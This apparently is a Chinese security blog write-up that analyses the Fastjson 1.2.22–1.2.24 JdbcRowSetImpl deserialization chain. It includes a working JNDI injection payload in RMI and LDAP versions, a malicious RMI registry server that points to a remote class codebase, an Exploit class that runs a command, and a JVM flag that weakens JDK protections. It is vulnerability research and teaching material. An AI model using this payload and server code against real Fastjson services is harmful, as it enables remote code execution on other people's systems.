---
title: Fastjson JdbcRowSetImpl利用链
categories:
  - Web安全
tags:
  - Fastjson反序列化
  - 漏洞分析
  - JavaSec
toc: true 文章目录
author: BlBana
date: 2020-04-16 19:54:02
description:
comments:
original:
permalink:

---

> 入坑系列第四篇，这篇主要分析JdbcRowSetImpl利用链，这条链主要利用了setAutoCommit方法调用InitialContext.lookup并且参数是未经过滤dataSourceName，导致JNDI注入，造成命令执行。其中涉及许多了JDNI注入 + RMI/LDAP 的知识，废话起来可能会很多，单独开一篇文章来分析，本篇主要还是聚焦当前在Fastjson反序列化上的一些困惑，完成这条链后，再把有强关联的Fastjson补丁Bypass内容进行补充。

<!-- more -->

---

# Fastjson JdbcRowSetImpl利用链

# 背景

JdbcRowSetImpl利用链有两种利用方式，都基于Bean Property类型的JNDI利用

> RMI可以作为反序列化漏洞的入口（CVE-2017-3241），也可以利用RMI构造EXP实现远程代码执行

- JNDI + RMI
- JNDI + LDAP

# 漏洞类型

反序列化 + JNDI注入 引起命令执行

# 影响范围

Fastjson 1.2.22 —— 1.2.24，在1.2.25主要结合各种黑名单绕过使用。

# 漏洞复现

## 限制

主要限制因素是JDK版本。基于RMI利用的JDK版本 ≤ 6u141、7u131、8u121，基于LDAP利用的JDK版本 ≤ 6u211、7u201、8u191。

## PoC分析

JNDI类型PoC主要分类：

- 基于JNDI Bean Property类型（本篇主要分析）
- 基于JNDI Field类型

两种类型区别主要在于，Bean Property需要借助setter，getter方法触发；而Field类型没有这个限制

```java
String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}";
```


- **@type：**目标反序列化类名；
- **dataSourceName：**RMI注册中心绑定恶意服务；
- **autoCommit：**调用setAutoCommit方法，利用lookup方法加载远程对象。

## 复现

- JNDI + RMI

  ```java
  package cc.blbana.vul.fastjson;
  
  import com.alibaba.fastjson.JSON;
   
  public class FJPoC {
      /**
       * 构造Json PoC，反序列化漏洞入口文件
       * @param args
       */
      public static void main(String[] args) {
          String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}";
          JSON.parse(PoC);
      }
  }
  ```

  ```java
  package cc.blbana.vul.fastjson;
  
  import com.sun.jndi.rmi.registry.ReferenceWrapper;
   
  import javax.naming.NamingException;
  import javax.naming.Reference;
  import java.rmi.AlreadyBoundException;
  import java.rmi.RemoteException;
  import java.rmi.registry.LocateRegistry;
  import java.rmi.registry.Registry;
   
  public class RMIServer {
      /**
       * RMIServer启动
       * @param args
       */
      public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
          Registry registry = LocateRegistry.createRegistry(1099);
          System.out.println("Java RMI registry created. port on 1099");
          Reference reference = new Reference("Exploit", "Exploit", "http://127.0.0.1:8000/");
          ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
          registry.bind("Exploit", referenceWrapper);
      }
  }
  ```

  ```java
  import javax.naming.Context;
  import javax.naming.Name;
  import javax.naming.spi.ObjectFactory;
  import java.io.IOException;
  import java.io.Serializable;
  import java.util.Hashtable;
   
  public class Exploit implements ObjectFactory, Serializable {
      /**
       * 要注册的Exploit
       */
      public Exploit() {
          try {
          			 Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
          } catch (IOException e) {
              e.printStackTrace();
          }
      }
   
      @Override
      public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
          return null;
      }
   
      public static void main(String[] args) {
          Exploit exploit = new Exploit();
      }
  }
  ```

  1. 运行RMIServer
  2. 编译Exploit.class文件，并在该目录启动HTTP Server
  3. 运行FJPoC.java复现

![Fastjson%20JdbcRowSetImpl/Untitled.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonJdbcRowImpl/0.png)

- JNDI + LDAP

  ```java
  // 修改PoC Json字符串中的地址
  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}
  ```

- 启动LDAPServer

- [Exploit.java](http://exploit.java) 不变

# 漏洞详情

先在JSON.parse(PoC)打下断点，开始调试。大体流程跟之前TemplatesImpl是一致的，这里主要跟进一下不一样的地方。先在parseObject中加载目标Class

![Fastjson%20JdbcRowSetImpl/Untitled%201.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonJdbcRowImpl/1.png)

获取到@type指定Class类型后，和之前流程一样，进入到`this.config.getDeserializer` 方法生成该类型的反序列化器。不一样的是这里利用了Java ASM机制，动态生成类，由于此类的Java源文件没有，无法进行调试，按照之前的逻辑，在`FastjsonASMDeserializer_1_JdbcRowSetImpl`中会获取到属性的key值，并通过`DefaultFieldDeserializer.parseField`方法反序列化属性

对ASM不是很了解，找到了这么一段概念描述：*（按照我的理解，因为ASM直接生成Class文件，没有对应的Java文件，因此无法对类进行调试），ASM的实例在`ParseConfig.createJavaBeanDeserializer` 方法中生成*

> ASM 是一个 Java 字节码操控框架。它能被用来动态生成类或者增强既有类的功能。ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为。Java class 被存储在严格格式定义的 .class 文件里，这些类文件拥有足够的元数据来解析类中的所有元素：类名称、方法、属性以及 Java 字节码（指令）。ASM 从类文件中读入信息后，能够改变类行为，分析类信息，甚至能够根据用户要求生成新类。

![Fastjson%20JdbcRowSetImpl/Untitled%202.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonJdbcRowImpl/2.png)

直接跳过上述部分，进入到`parseField`中，调用`fieldValueDeserilizer.deserialze`获取dataSourceName属性值

![Fastjson%20JdbcRowSetImpl/Untitled%203.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonJdbcRowImpl/3.png)

setValue中反射调用`setDataSourceName`进行赋值，之后对`autoCommit`属性进行反序列化

[这里之前也提到过](https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/#3-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BC%9A%E8%B0%83%E7%94%A8getOutputProperties%E6%96%B9%E6%B3%95)，使用同样的方式，在JavaBeanInfo.build中，将符合条件setter，getter的Method放入到`FieldInfo`中，用于下面的反射操作

![Fastjson%20JdbcRowSetImpl/Untitled%204.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonJdbcRowImpl/4.png)

![Fastjson%20JdbcRowSetImpl/Untitled%205.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonJdbcRowImpl/5.png)

进去跟进setAutoCommit方法，由于`this.conn = null` 进入到 `this.connect()` 方法中

```java
public void setAutoCommit(boolean var1) throws SQLException {
				// this.comm = null 引入else
        if (this.conn != null) {
            this.conn.setAutoCommit(var1);
        } else {
            this.conn = this.connect();
            this.conn.setAutoCommit(var1);
        }

}
```

跟进connect方法，其中直接获取了`dataSourceName` 中RMI地址，并调用`lookup`发起请求，由于RMI服务器上已经注册好了恶意类，最终导致命令执行

![Fastjson%20JdbcRowSetImpl/Untitled%206.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonJdbcRowImpl/6.png)

# 版本问题

基于RMI利用的JDK版本 ≤ 6u141、7u131、8u121，由于我默认环境为JDK8u211测试报错，在8u121版本后默认关闭了`com.sun.jndi.rmi.object.trustURLCodebase` 无法直接复现，为了方便测试可以直接在JVM参数里加入`-Dcom.sun.jndi.rmi.object.trustURLCodebase=true` 。下图为未开启参数的报错信息

![Fastjson%20JdbcRowSetImpl/Untitled%207.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonJdbcRowImpl/7.png)

# 坑点

JDK低版本（需要类名 和 包名不一致，且Exploit编译的class中不能有包名）

- Factory 为类名，且Exploit有完整包名，主要保持二者不一致，否则会直接从本地加载类；
- Exploit编译class文件前要先注释包名，否则会在PoC运行抛出异常；
- 开启HTTP服务

JDK高版本（无法通过加载HTTP Class的形式触发）

- Factory 与 Exploit 不一致，抛出Cast异常；
- Factory 与 Exploit 一致，直接本地加载class完成攻击

# 总结

分析完这个利用链后，发现自己对JNDI的知识还是没有太深的理解，这块后续还要深入学习研究一下。可以看到JNDI自从2017年被@pwntester分享出来后，有很多反序列化，RCE漏洞会利用到这个知识点，加强学习一下是很有必要的。

# 参考链接

- [https://paper.seebug.org/1091/#jndi](https://paper.seebug.org/1091/#jndi)
- [http://xxlegend.com/2018/10/23/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/](http://xxlegend.com/2018/10/23/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/)
- [http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/](http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/)
- [https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/#基于JdbcRowSetImpl的利用链](https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/#基于JdbcRowSetImpl的利用链)

